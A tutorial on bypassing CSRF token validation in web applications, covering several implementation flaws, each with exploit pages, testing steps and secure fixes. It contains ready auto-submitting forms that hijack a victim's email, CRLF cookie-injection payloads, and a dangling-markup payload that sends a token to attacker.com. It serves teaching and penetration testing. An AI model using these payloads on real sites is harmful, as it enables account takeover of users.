# Bypassing CSRF Token Validation

CSRF tokens are the most widely deployed defence against cross-site request forgery, but their effectiveness depends entirely on correct implementation—a CSRF token that exists in a form but is never properly validated server-side, not tied to the user's session, or vulnerable to attacker-controlled substitution provides no meaningful security at all, despite creating a false sense of protection. Real-world applications frequently contain subtle but critical flaws in their CSRF token validation logic, ranging from complete skipping of validation on certain HTTP methods or when the token is simply omitted, through to architectural weaknesses where tokens are issued from a global pool rather than bound to individual user sessions, or where the token-to-cookie binding can be manipulated by exploiting other vulnerability classes like CRLF injection, subdomain takeover, or cross-site scripting. Understanding these bypass techniques is essential both for security professionals performing penetration tests and for developers building secure applications, because the gap between "we have CSRF tokens" and "our CSRF protection is secure" is wide enough to render an entire application's state-changing functionality vulnerable to unauthorized manipulation despite the apparent presence of anti-CSRF controls. 

The central insight: **the presence of a CSRF token mechanism does not guarantee CSRF protection — only correct implementation, strict validation, and proper session binding do**.

## What is a CSRF Token?

### Definition and purpose

**Core concept:**

```
CSRF token = A unique, secret, unpredictable value
Generated by: Server-side application (per-session or per-request)
Shared with: Client (via hidden form field, response header, cookie)
Required for: Any request performing a sensitive/state-changing action
Validated by: Server before processing the request

Security guarantee:
Attacker CANNOT read victim's page cross-origin (Same-Origin Policy)
Therefore attacker CANNOT know victim's CSRF token value
Therefore attacker CANNOT forge a valid request on victim's behalf
Therefore CSRF attack fails
```

**Typical implementation:**

```html
<!-- Server includes CSRF token in every sensitive form -->
<form name="change-email-form" 
      action="/my-account/change-email" 
      method="POST">
    
    <label>Email</label>
    <input required type="email" name="email" value="user@normal-website.com">
    
    <!-- Hidden CSRF token field -->
    <input required type="hidden" 
           name="csrf" 
           value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
    
    <button class="button" type="submit">Update email</button>
</form>
```

**Resulting HTTP request:**

```http
POST /my-account/change-email HTTP/1.1
Host: normal-website.com
Content-Length: 70
Content-Type: application/x-www-form-urlencoded
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=user@normal-website.com
```

**Server-side validation logic (secure):**

```javascript
app.post('/my-account/change-email', (req, res) => {
    const sessionToken = req.session.csrfToken;      // Stored server-side
    const submittedToken = req.body.csrf;            // From request body
    
    // Validate: token present AND matches session token
    if (!submittedToken || submittedToken !== sessionToken) {
        return res.status(403).send('Invalid CSRF token');
    }
    
    // Optionally rotate token after use
    req.session.csrfToken = generateNewToken();
    
    // Process the email change
    updateEmail(req.user.id, req.body.email);
    res.redirect('/my-account');
});
```

**How it blocks CSRF:**

```
Legitimate request flow:
1. User visits /my-account (same-origin)
2. Server includes csrf=SECRET_TOKEN in form
3. User submits form → token included automatically
4. Server validates token → match → request processed ✓

CSRF attack attempt:
1. Victim visits attacker's forged page
2. Attacker cannot read victim's token (SOP blocks cross-origin reads)
3. Attacker submits form WITHOUT valid token (or with guessed token)
4. Server validates token → mismatch or missing → 403 Forbidden ✗

CSRF blocked because attacker cannot know the secret token value
```

### Token transmission methods

**Method 1: Hidden form field (most common)**

```html
<input type="hidden" name="csrf_token" value="TOKEN_VALUE">

Advantages:
✓ Simple to implement
✓ Works with standard HTML forms
✓ No JavaScript required for submission

Disadvantages:
✗ Only works in form submissions
✗ Appears in server logs if accidentally included in URL
✗ Visible in browser developer tools (DOM)
```

**Method 2: HTTP request header**

```javascript
// Client sends CSRF token as custom header
fetch('/api/change-email', {
    method: 'POST',
    headers: {
        'X-CSRF-Token': getCsrfTokenFromMeta(),
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ email: 'new@example.com' })
});

// HTML includes token in meta tag
<meta name="csrf-token" content="TOKEN_VALUE">

// Server validates header
const token = req.headers['x-csrf-token'];
```

```
Advantages:
✓ Cannot be set cross-origin by HTML forms
✓ More flexible for API designs
✓ Not visible in form DOM

Disadvantages:
✗ Requires JavaScript (no plain HTML form support)
✗ More complex implementation
```

**Method 3: Cookie + header (double submit - covered later)**

```http
Cookie: csrf_token=TOKEN_VALUE
X-CSRF-Token: TOKEN_VALUE (also in header)
```

## Bypass 1: Validation Depends on Request Method

### The vulnerability

**Flawed validation logic:**

```javascript
// VULNERABLE server-side code
app.all('/email/change', (req, res) => {
    
    // BUG: Only validates CSRF on POST requests
    if (req.method === 'POST') {
        const token = req.body.csrf_token;
        if (!token || token !== req.session.csrfToken) {
            return res.status(403).send('Invalid CSRF token');
        }
    }
    // GET requests skip CSRF validation entirely!
    
    // Process the email change regardless of method
    const newEmail = req.body.email || req.query.email;
    updateEmail(req.user.id, newEmail);
    res.redirect('/my-account');
});
```

**Why this happens:**

```
Developer assumptions:
"GET requests don't change state, so CSRF validation
only needed for POST"

But the implementation actually processes state changes
on GET requests too!

Common scenarios:
- Developer adds CSRF check to POST handler
- But endpoint also handles GET (REST design)
- Or developer copies endpoint and forgets CSRF check
- Or framework middleware only runs on POST by default
```

### Exploitation

**Intercepting and modifying the request:**

```http
Original legitimate request (POST - CSRF validated):
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

csrf=ValidToken123&email=user@normal.com

Attacker's modified request (GET - CSRF validation skipped!):
GET /email/change?email=attacker@evil-user.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

No CSRF token needed!
```

**Attack exploit page:**

```html
<!-- GET-based CSRF - simpler and more stealthy -->
<!-- Works with just an image tag! -->
<html>
<body>
    <h1>Loading...</h1>
    
    <!-- Triggers GET request silently -->
    <img src="https://vulnerable-website.com/email/change?email=attacker@evil-user.net"
         style="display:none">
    
    <!-- Or use a form with method override -->
    <form action="https://vulnerable-website.com/email/change" method="GET">
        <input type="hidden" name="email" value="attacker@evil-user.net">
    </form>
    <script>document.forms[0].submit();</script>
</body>
</html>
```

**Testing methodology:**

```
Step 1: Identify a state-changing POST request protected by CSRF token
POST /email/change HTTP/1.1
csrf=ValidToken&email=test@test.com

Step 2: Intercept in Burp Proxy

Step 3: Change request method to GET in Burp Repeater:
Right-click → Change request method
OR manually reconstruct:
GET /email/change?csrf=ValidToken&email=test@test.com

Step 4: Remove CSRF token parameter entirely:
GET /email/change?email=test@test.com

Step 5: Send and observe:
- 200 OK / redirect = CSRF validation skipped on GET → VULNERABLE
- 403 Forbidden = CSRF validated on GET too → not vulnerable this way

Step 6: Construct exploit page with GET request delivery
```

### Secure fix

```javascript
// SECURE: Validate CSRF on ALL state-changing methods
// AND reject state changes via GET entirely

// Option 1: Explicitly reject GET for state-changing operations
app.get('/email/change', (req, res) => {
    return res.status(405).send('Method Not Allowed');
    // GET should only DISPLAY forms, never process them
});

app.post('/email/change', (req, res) => {
    // Validate CSRF token
    const token = req.body.csrf_token;
    if (!token || token !== req.session.csrfToken) {
        return res.status(403).send('Invalid CSRF token');
    }
    // Process request
    updateEmail(req.user.id, req.body.email);
    res.redirect('/my-account');
});

// Option 2: CSRF middleware that applies to ALL methods
app.use('/email/change', csrfMiddleware);  // No method restriction
```

## Bypass 2: Validation Depends on Token Being Present

### The vulnerability

**Flawed conditional validation:**

```javascript
// VULNERABLE: Only validates if token is present
app.post('/email/change', (req, res) => {
    
    const submittedToken = req.body.csrf_token;
    
    // BUG: Skips validation entirely if token is absent!
    if (submittedToken) {
        // Only reaches here if token was included
        if (submittedToken !== req.session.csrfToken) {
            return res.status(403).send('Invalid CSRF token');
        }
        // Token present and matches: allowed
    }
    // If no token: falls through silently!
    
    updateEmail(req.user.id, req.body.email);
    res.redirect('/my-account');
});
```

**Why this flaw exists:**

```
Developer intent: "Check if the token is correct when provided"

Developer assumption: "All legitimate requests will include the token"

Oversight: "What if someone just... doesn't send the token?"

Result:
- Wrong value: 403 Forbidden ✓ (rejected)
- Correct value: 200 OK ✓ (processed)
- No value at all: 200 OK ✗ (also processed - VULNERABILITY!)

Real-world causes:
- Code added token check as afterthought
- Misunderstanding of || (OR) vs && (AND) logic
- Framework behavior misunderstood
- Copy-paste of conditional without complete logic
```

### Exploitation

**Original request (with token):**

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

csrf=WfF1szMUHhiokx9AHFply5L2xAOfjRkE&email=user@normal.com
```

**Attack: Remove entire token parameter (not just value):**

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

email=attacker@evil-user.net
```

```
Critical distinction:

Sending empty value:
csrf=&email=attacker@evil.com
→ Empty string may still trigger validation (depends on implementation)
→ May return 403 if empty string checked

Sending no parameter:
email=attacker@evil.com
→ req.body.csrf_token is undefined
→ if (submittedToken) evaluates to FALSE
→ Validation block skipped entirely
→ Request processed! 

Always test BOTH removing value AND removing parameter entirely
```

**Exploit page:**

```html
<!-- Simply omit the CSRF token parameter entirely -->
<html>
<body onload="document.forms[0].submit()">
    <form action="https://vulnerable-website.com/email/change" method="POST">
        <!-- No csrf_token field at all -->
        <input type="hidden" name="email" value="attacker@evil-user.net">
    </form>
</body>
</html>
```

**Testing variations:**

```
Test 1: Remove entire csrf parameter
Body: email=test@test.com
(No csrf parameter)

Test 2: Send empty csrf value
Body: csrf=&email=test@test.com

Test 3: Send null/undefined representations
Body: csrf=null&email=test@test.com
Body: csrf=undefined&email=test@test.com
Body: csrf=false&email=test@test.com

Test 4: Send csrf parameter with no value
Body: csrf&email=test@test.com

Test 5: Send csrf=0
Body: csrf=0&email=test@test.com
(0 may evaluate as falsy in some languages)
```

### Secure fix

```javascript
// SECURE: Require token presence AND correct value

app.post('/email/change', (req, res) => {
    const submittedToken = req.body.csrf_token;
    const sessionToken = req.session.csrfToken;
    
    // MUST validate:
    // 1. Token was submitted (not undefined/null/empty)
    // 2. Session has a token
    // 3. Submitted token exactly matches session token
    
    if (!submittedToken || !sessionToken || submittedToken !== sessionToken) {
        return res.status(403).send('CSRF validation failed');
    }
    
    updateEmail(req.user.id, req.body.email);
    res.redirect('/my-account');
});

// PHP equivalent (common mistake to avoid):
// INSECURE:
if (isset($_POST['csrf']) && $_POST['csrf'] == $_SESSION['csrf']) { ... }
// Fails if csrf not in POST at all

// SECURE:
if (!isset($_POST['csrf']) || $_POST['csrf'] !== $_SESSION['csrf']) {
    http_response_code(403);
    die('CSRF token missing or invalid');
}
```

## Bypass 3: Token Not Tied to User Session

### The vulnerability

**Global token pool (incorrect implementation):**

```javascript
// VULNERABLE: Application maintains shared token pool
// Not tied to individual user sessions

const globalTokenPool = new Set();

// Token generation (stores globally, not per-session)
function generateCsrfToken() {
    const token = crypto.randomBytes(32).toString('hex');
    globalTokenPool.add(token);
    return token;
}

// FLAWED validation
app.post('/email/change', (req, res) => {
    const submittedToken = req.body.csrf;
    
    // BUG: Only checks "is this a valid token we issued?"
    // Not: "is this token issued for THIS user's session?"
    if (!globalTokenPool.has(submittedToken)) {
        return res.status(403).send('Invalid CSRF token');
    }
    
    globalTokenPool.delete(submittedToken);
    updateEmail(req.user.id, req.body.email);
    res.redirect('/my-account');
});
```

**Why this flaw exists:**

```
Developer intent: "Generate random tokens and validate them"

Architectural mistake: Token pool shared across all users
- Any valid token = any user's request passes
- No binding between token and the specific session that generated it

Common scenarios:
- Stateless token system without session binding
- Two frameworks used: session handler + CSRF library not integrated
- Microservice architecture where token service is decoupled
- Token stored in database without user_id association
```

### Exploitation

**Attack flow:**

```
Prerequisites:
- Attacker has their own account on the application
- Application uses global token pool

Step 1: Attacker logs into their own account
POST /login
username=attacker&password=attacker_password

Step 2: Attacker visits the sensitive form page
GET /my-account/change-email
→ Server includes CSRF token in form:
  <input type="hidden" name="csrf" value="ATTACKER_VALID_TOKEN">

Step 3: Attacker copies their own valid CSRF token
Token: 50FaWgdOhi9M9wyna8taR1k3ODOR8d6u

Step 4: Attacker constructs exploit page using THEIR token
(Token is valid in global pool, regardless of which session uses it)

Step 5: Victim visits exploit page
→ Form submits with attacker's CSRF token
→ Victim's session cookie automatically included
→ Server validates: "Is 50FaWgdOhi9M9wyna8taR1k3ODOR8d6u in the pool?" → YES
→ Server processes request (victim's email changed!)
→ CSRF bypass successful!
```

**Exploit page:**

```html
<!-- Uses attacker's own valid CSRF token -->
<html>
<body onload="document.forms[0].submit()">
    <form action="https://vulnerable-website.com/my-account/change-email"
          method="POST">
        
        <input type="hidden" name="email" value="attacker@evil-user.net">
        
        <!-- Attacker's own valid CSRF token works for ANY user -->
        <input type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
        
    </form>
</body>
</html>
```

**Testing methodology:**

```
Step 1: Create two test accounts (Account A, Account B)

Step 2: Log in as Account A
GET /my-account/change-email
Extract CSRF token from form: TOKEN_A

Step 3: Log in as Account B in different browser
GET /my-account/change-email
Extract CSRF token: TOKEN_B

Step 4: With Account B's session, submit form using TOKEN_A
POST /my-account/change-email
Cookie: session=ACCOUNT_B_SESSION
Body: csrf=TOKEN_A&email=test@test.com

Step 5: Observe result:
- 403 Forbidden = Token tied to session → not vulnerable this way
- 200 OK / redirect = Token NOT tied to session → VULNERABLE!

Token A worked for Account B's session = global pool confirmed
```

### Secure fix

```javascript
// SECURE: Token tied to specific user session

// Token generation: Store in session
app.get('/my-account/change-email', (req, res) => {
    // Generate token FOR THIS USER'S SESSION
    const csrfToken = crypto.randomBytes(32).toString('hex');
    req.session.csrfToken = csrfToken;  // Stored IN the session
    
    res.render('change-email', { csrfToken });
});

// Token validation: Compare against THIS SESSION's token
app.post('/my-account/change-email', (req, res) => {
    const submittedToken = req.body.csrf;
    const sessionToken = req.session.csrfToken;  // THIS session's token
    
    // Fails if:
    // - Token missing
    // - Token doesn't match THIS SESSION's token
    // - Even if token is valid for a different session
    if (!submittedToken || !sessionToken || submittedToken !== sessionToken) {
        return res.status(403).send('CSRF validation failed');
    }
    
    updateEmail(req.user.id, req.body.email);
    res.redirect('/my-account');
});
```

## Bypass 4: Token Tied to Non-Session Cookie

### The vulnerability

**Mismatched cookie architecture:**

```http
Vulnerable application uses TWO separate cookies:
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF   (session tracking)
Cookie: csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv   (CSRF tracking - separate!)

Request body:
csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=user@normal.com

Validation logic:
1. Server looks up csrfKey cookie → finds associated CSRF token
2. Compares: token associated with csrfKey == submitted csrf parameter?
3. If match → allowed

NOT validating: Does csrfKey cookie belong to the same session?
```

**Why this architecture exists:**

```
Application uses two different frameworks:
Framework 1: Session management (e.g., Express-session)
Framework 2: CSRF protection (e.g., separate CSRF library)

These frameworks operate independently:
- Session framework: Manages session cookie
- CSRF framework: Manages its own csrf cookie + token pair
- No integration between them

The CSRF framework correctly validates its own cookie ↔ token pair
But no one validates session ↔ csrfKey binding

Result:
Attacker can use their OWN csrfKey cookie + matching csrf token
As long as csrfKey value matches csrf body parameter → validated
Session cookie doesn't matter to the CSRF check
```

### Exploitation

**Requirements:**

```
Attacker needs:
1. Their own valid csrfKey cookie value
2. The corresponding csrf token value
3. A way to set csrfKey cookie in victim's browser

How to obtain (1) and (2):
→ Log in to own account on the application
→ Capture csrfKey cookie and associated csrf token from response

How to achieve (3) - cookie injection:
→ Find any endpoint that sets cookies in the application/domain
→ CRLF injection vulnerability (header injection)
→ Subdomain takeover
→ Any other cookie-setting functionality
```

**Cookie injection via CRLF:**

```http
CRLF injection in a search parameter:
GET /search?term=test%0d%0aSet-Cookie:%20csrfKey=ATTACKER_KEY HTTP/1.1

%0d%0a = \r\n (CRLF)

If server reflects this in headers:
HTTP/1.1 200 OK
Content-Type: text/html
X-Search-Term: test
Set-Cookie: csrfKey=ATTACKER_KEY  ← Injected!

Victim's browser now has:
Cookie: session=VICTIM_SESSION; csrfKey=ATTACKER_KEY
```

**Cookie injection via img tag (CRLF in URL):**

```html
<!-- Inject Set-Cookie header via image request -->
<img src="https://vulnerable-website.com/search?term=test%0d%0aSet-Cookie:%20csrfKey=ATTACKER_KEY%3b%20SameSite=None"
     onerror="document.forms[0].submit()">

<!-- When browser loads image: -->
1. Makes GET request to /search with injected CRLF
2. Server reflects Set-Cookie header
3. csrfKey cookie set to ATTACKER_KEY in victim's browser
4. onerror triggers form submission
5. Form submits with victim's session + attacker's csrfKey + attacker's csrf token
6. Server validates: csrfKey=ATTACKER_KEY matches csrf=ATTACKER_TOKEN → VALID!
7. CSRF bypassed!
```

**Complete exploit page:**

```html
<html>
<body>
    <!-- Step 1: Submit form with attacker's CSRF token -->
    <form action="https://vulnerable-website.com/my-account/change-email" 
          method="POST">
        <input type="hidden" name="email" value="attacker@evil-user.net">
        <!-- Attacker's known CSRF token -->
        <input type="hidden" name="csrf" value="RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY">
    </form>
    
    <!-- Step 2: Inject matching csrfKey cookie, then submit form -->
    <!-- URL-encoded \r\n to inject Set-Cookie header -->
    <img src="https://vulnerable-website.com/?search=test%0d%0aSet-Cookie:%20csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv%3b%20SameSite=None"
         onerror="document.forms[0].submit()">
    
    <!--
    Flow:
    1. Browser loads img src → GET request to vulnerable site
    2. CRLF injection sets csrfKey=ATTACKER_VALUE in victim's browser
    3. Image "fails" (onerror triggers)
    4. Form submits with:
       - Cookie: session=VICTIM_SESSION (auto-included)
       - Cookie: csrfKey=ATTACKER_KEY (just injected)
       - Body: csrf=ATTACKER_TOKEN
    5. Server: csrfKey matches csrf? YES → processes request
    -->
</body>
</html>
```

**Subdomain cookie injection:**

```
Cookie scope: .normal-website.com (applies to all subdomains)

If attacker controls/exploits: staging.demo.normal-website.com
→ Can set cookies scoped to .normal-website.com
→ Those cookies reach secure.normal-website.com

Example:
staging.demo.normal-website.com sets:
Set-Cookie: csrfKey=ATTACKER_KEY; Domain=normal-website.com

This cookie is sent to secure.normal-website.com
Attacker uses same technique as above
```

### Secure fix

```javascript
// SECURE: Tie CSRF token to the session, not a separate cookie

// All-in-one: Store token in session (no separate cookie)
app.use((req, res, next) => {
    if (!req.session.csrfToken) {
        req.session.csrfToken = crypto.randomBytes(32).toString('hex');
    }
    next();
});

app.post('/my-account/change-email', (req, res) => {
    // Validate against SESSION token only
    if (req.body.csrf !== req.session.csrfToken) {
        return res.status(403).send('CSRF validation failed');
    }
    updateEmail(req.user.id, req.body.email);
    res.redirect('/my-account');
});

// If separate CSRF framework unavoidable:
// Ensure framework is integrated with session system
// Validate: token ↔ csrfKey cookie AND csrfKey cookie ↔ session
```

## Bypass 5: CSRF Token Duplicated in Cookie (Double Submit)

### The vulnerability

**Naïve double submit cookie implementation:**

```http
Vulnerable request:
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=user@normal.com

Validation logic:
if (req.cookies.csrf === req.body.csrf) {
    // Allowed!  (no server-side state required)
}
```

**The double submit pattern explained:**

```
Intended security model:
1. Server generates random CSRF token on login
2. Token stored in csrf cookie (readable by JavaScript)
3. JavaScript reads cookie → inserts as hidden form field
4. On submit: csrf cookie value == csrf body parameter
5. Server checks: cookie == body? → attacker can't forge this
   (attacker can't read victim's cookie cross-origin → can't know value)

Why it's attractive:
✓ No server-side session storage needed
✓ Stateless (works with CDNs, multiple servers)
✓ Simple to implement
✓ Scales easily

The fatal flaw:
If attacker can SET the csrf cookie in victim's browser,
they control both sides of the comparison:
csrf cookie = ATTACKER_CONTROLLED
csrf body parameter = SAME ATTACKER VALUE
→ cookie == body → TRUE → validation passes!
```

**Exploitation:**

```
Attacker:
1. Invents any value: csrf=fake_token_123
2. Injects csrf=fake_token_123 cookie into victim's browser
   (via CRLF injection, subdomain, or any cookie-setting mechanism)
3. Submits form with csrf=fake_token_123 in body

Server validates:
req.cookies.csrf === req.body.csrf
"fake_token_123" === "fake_token_123"
→ TRUE → Allowed!

No need to know or steal victim's real token!
No need to even log into the application!
```

**Exploit page using CRLF injection:**

```html
<html>
<body>
    <form action="https://vulnerable-website.com/email/change" method="POST">
        <input type="hidden" name="email" value="attacker@evil-user.net">
        <!-- Attacker's invented token value -->
        <input type="hidden" name="csrf" value="attacker_invented_token">
    </form>
    
    <!-- Inject matching csrf cookie, then submit form -->
    <img src="https://vulnerable-website.com/?search=x%0d%0aSet-Cookie:%20csrf=attacker_invented_token%3b%20SameSite=None"
         onerror="document.forms[0].submit()">

    <!--
    Result:
    Cookie: session=VICTIM_SESSION; csrf=attacker_invented_token
    Body: csrf=attacker_invented_token

    Comparison: attacker_invented_token === attacker_invented_token → TRUE!
    CSRF protection completely bypassed without knowing any real token!
    -->
</body>
</html>
```

**Testing for this pattern:**

```
Step 1: Identify double submit pattern in request
POST /email/change
Cookie: csrf=TOKEN_VALUE
Body: csrf=TOKEN_VALUE (same value in both places)

Step 2: Confirm validation logic
Modify body csrf value → 403? (validates correctly)
Modify cookie csrf value to match new body → 200? (VULNERABLE!)

Step 3: Verify cookie injection is possible
Test CRLF injection:
GET /?search=test%0d%0aSet-Cookie:%20csrf=injected_value
Check response headers for reflected Set-Cookie

Step 4: Construct exploit
Inject csrf=my_fake_value cookie
Submit form with csrf=my_fake_value in body
```

### Secure double submit (HMAC-bound)

```javascript
// SECURE double submit: Sign token with server-side secret
const crypto = require('crypto');
const SECRET = process.env.CSRF_SECRET;  // Server-side only

function generateSecureDoubleSubmitToken(sessionId) {
    // Token is HMAC of session ID
    // Cannot be forged without knowing SECRET
    return crypto.createHmac('sha256', SECRET)
                 .update(sessionId)
                 .digest('hex');
}

function validateSecureDoubleSubmitToken(sessionId, cookieToken, bodyToken) {
    // Both must match AND must be valid for THIS session
    const expectedToken = generateSecureDoubleSubmitToken(sessionId);
    
    return cookieToken === bodyToken &&
           cookieToken === expectedToken;
    // Even if attacker injects a cookie value they know,
    // it won't match expectedToken (requires server SECRET)
}

// Set cookie:
const token = generateSecureDoubleSubmitToken(req.sessionID);
res.cookie('csrf_token', token, {
    httpOnly: false,  // Must be readable by JavaScript
    secure: true,
    sameSite: 'strict'
});

// Validate:
app.post('/email/change', (req, res) => {
    const cookieToken = req.cookies.csrf_token;
    const bodyToken = req.body.csrf_token;
    const sessionId = req.sessionID;
    
    if (!validateSecureDoubleSubmitToken(sessionId, cookieToken, bodyToken)) {
        return res.status(403).send('CSRF validation failed');
    }
    
    updateEmail(req.user.id, req.body.email);
    res.redirect('/my-account');
});

// Now even if attacker injects csrf_token cookie with a known value:
// expectedToken = HMAC(session_id, SECRET) ≠ attacker's injected value
// Validation fails → CSRF blocked
```

**Cookie prefixes as additional protection:** 

```http
Using __Host- cookie prefix:
Set-Cookie: __Host-csrf=TOKEN; Secure; Path=/; SameSite=Strict

__Host- prefix requirements enforced by browser:
✓ Must be Secure
✓ Must NOT have Domain attribute
✓ Must have Path=/

Effect on CSRF bypass:
Attacker tries to inject: Set-Cookie: __Host-csrf=ATTACKER_VALUE
Browser REJECTS __Host- cookie if:
- Not from HTTPS response
- Has Domain attribute
- Has non-root Path

Prevents subdomain and CRLF injection attacks from overwriting cookie!
Cross-subdomain injection blocked by browser
```

## Additional Bypass Techniques

### Bypass 6: Token leaked in URL/Referer

```
Vulnerability: CSRF token transmitted in URL parameter
GET /page?csrf_token=SECRET&other_param=value

Leakage vectors:
1. Referer header sent to third-party sites
   User clicks link to external site from CSRF-protected page
   Browser sends: Referer: https://victim.com/page?csrf_token=SECRET

2. Browser/proxy logs
   HTTPS protects in transit but token visible in access logs

3. Analytics/tracking scripts
   Third-party scripts may capture full URL including query params

4. Bookmark sharing
   User bookmarks/shares URL containing token

Attack:
Attacker reads their own referral logs or analytics
Victim visited attacker-controlled page after being on victim site
Referer header contains CSRF token
Attacker uses stolen token for CSRF attack within token validity period
```

### Bypass 7: HTML injection for token theft

```html
<!-- If attacker has HTML injection (but not JavaScript execution): -->
<!-- Can use dangling markup to steal CSRF token -->

Injected payload:
"><img src='https://attacker.com/steal?

Rendered:
<input name="email" value=""><img src='https://attacker.com/steal?">
<input type="hidden" name="csrf_token" value="STOLEN_TOKEN_VALUE">

Browser behavior:
1. img src attribute starts but never closes (single quote delimiter)
2. Browser reads forward until next single quote
3. Entire hidden field INCLUDING token sent to attacker.com
4. Attacker reads token from server logs
5. Uses token in CSRF exploit
```

### Bypass 8: Weak token generation

```javascript
// VULNERABLE: Predictable token generation

// Math.random() - NOT cryptographically secure
function badTokenGeneration() {
    return Math.random().toString(36).substr(2);
}
// Math.random() output can be predicted from observed values
// Statistical attacks can narrow token space

// Timestamp-based - guessable
function badTimestampToken() {
    return Date.now().toString(36);
}
// Attacker knows approximate time → narrow brute-force window

// Short token - bruteforceable
function badShortToken() {
    return crypto.randomBytes(4).toString('hex');  // Only 32-bit entropy
}
// 2^32 = ~4 billion possibilities
// Feasible with rate limit bypass or distributed attack

// SECURE: Cryptographically strong, sufficient length
function secureToken() {
    return crypto.randomBytes(32).toString('hex');  // 256-bit entropy
}
// 2^256 = practically unguessable
```

### Bypass 9: Token not invalidated after use

```javascript
// VULNERABLE: Token reused indefinitely
app.post('/email/change', (req, res) => {
    if (req.body.csrf !== req.session.csrfToken) {
        return res.status(403).send('Invalid CSRF token');
    }
    // BUG: Token never rotated after use!
    updateEmail(req.user.id, req.body.email);
    res.redirect('/my-account');
});

// Consequence:
// Token stolen via Referer/dangling markup remains valid indefinitely
// No expiry = extended attack window

// SECURE: Rotate token after each use
app.post('/email/change', (req, res) => {
    if (req.body.csrf !== req.session.csrfToken) {
        return res.status(403).send('Invalid CSRF token');
    }
    
    // Immediately invalidate used token
    req.session.csrfToken = crypto.randomBytes(32).toString('hex');
    
    updateEmail(req.user.id, req.body.email);
    res.redirect('/my-account');
});
```
